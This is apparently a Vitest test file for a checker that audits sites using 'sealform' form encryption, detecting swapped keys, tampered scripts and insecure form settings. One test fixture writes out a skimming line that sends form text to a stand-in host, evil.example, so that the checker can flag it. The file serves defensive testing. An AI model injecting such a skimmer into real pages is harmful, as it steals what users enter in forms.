import { describe, expect, it } from "vitest";
import { checkSite } from "../src/check.js";
import { generateKeyPair, type KeyPair } from "../src/core.js";
import { createHash } from "node:crypto";

const JS = "/*sealform*/console.log(1)";
const JS_HASH = "sha384-" + createHash("sha384").update(JS).digest("base64");

function site(kp: KeyPair, opts: { html?: string; js?: string; csp?: string | null } = {}) {
  const html = opts.html ?? `<!doctype html>
<script src="/sealform.js" integrity="${JS_HASH}" crossorigin="anonymous"></script>
<form method="post" action="/contact" data-sealform-key="/.well-known/sealform-key.json">
  <textarea name="body" data-seal></textarea>
  <button type="submit" disabled data-sealform-submit>送信</button>
</form>`;
  return (async (input: string | URL) => {
    const u = new URL(String(input));
    const headers: Record<string, string> = {};
    if (opts.csp !== null) headers["content-security-policy"] = opts.csp ?? "default-src 'self'";
    if (u.pathname === "/") return new Response(html, { headers });
    if (u.pathname === "/sealform.js") return new Response(opts.js ?? JS);
    if (u.pathname === "/.well-known/sealform-key.json") return new Response(JSON.stringify(kp.publicDoc));
    return new Response("", { status: 404 });
  }) as typeof fetch;
}

const levels = (fs: { id: string; level: string }[], id: string) => fs.filter((f) => f.id === id).map((f) => f.level);

describe("sealform check", () => {
  it("正しく設定されたページは問題なし", async () => {
    const kp = await generateKeyPair();
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp), fingerprint: kp.publicDoc.fingerprint, knownScriptHashes: [JS_HASH],
    });
    expect(fs.filter((f) => f.level !== "pass")).toEqual([]);
  });

  it("公開鍵が差し替えられたら検出する", async () => {
    const kp = await generateKeyPair();
    const attacker = await generateKeyPair();
    const fs = await checkSite("https://example.org/", {
      fetch: site(attacker), fingerprint: kp.publicDoc.fingerprint, knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "key")).toEqual(["fail"]);
    expect(fs.find((f) => f.id === "key")!.message).toContain("差し替え");
  });

  it("JS が書き換えられたら検出する（SRI ごと書き換えられても公式ハッシュと照合する）", async () => {
    const kp = await generateKeyPair();
    const evil = JS + ";fetch('https://evil.example/'+document.forms[0].body.value)";
    const evilHash = "sha384-" + createHash("sha384").update(evil).digest("base64");
    const html = `<script src="/sealform.js" integrity="${evilHash}"></script>
<form method="post" data-sealform-key="/.well-known/sealform-key.json"><button disabled data-sealform-submit></button></form>`;
    const fs = await checkSite("https://example.org/", {
      fetch: site(kp, { html, js: evil }), fingerprint: kp.publicDoc.fingerprint, knownScriptHashes: [JS_HASH],
    });
    expect(levels(fs, "sri")).toEqual(["pass"]);
    expect(levels(fs, "script")).toEqual(["fail"]);
  });

  it("sealform が外されたページを検出する", async () => {
    const kp = await generateKeyPair();
    const fs = await checkSite("https://example.org/", { fetch: site(kp, { html: `<form method="post"><textarea name="body"></textarea></form>` }) });
    expect(levels(fs, "form")).toEqual(["fail"]);
  });

  it("送信ボタンが最初から押せる・GET・HTTP・CSP 無しを指摘する", async () => {
    const kp = await generateKeyPair();
    const html = `<script src="/sealform.js"></script>
<form method="get" data-sealform-key="/.well-known/sealform-key.json"><button data-sealform-submit>送信</button></form>`;
    const fs = await checkSite("http://example.org/", { fetch: site(kp, { html, csp: null }) });
    expect(levels(fs, "https")).toEqual(["fail"]);
    expect(levels(fs, "form-method")).toEqual(["fail"]);
    expect(levels(fs, "submit-guard")).toEqual(["fail"]);
    expect(levels(fs, "csp")).toEqual(["warn"]);
    expect(levels(fs, "sri")).toEqual(["warn"]);
  });
});
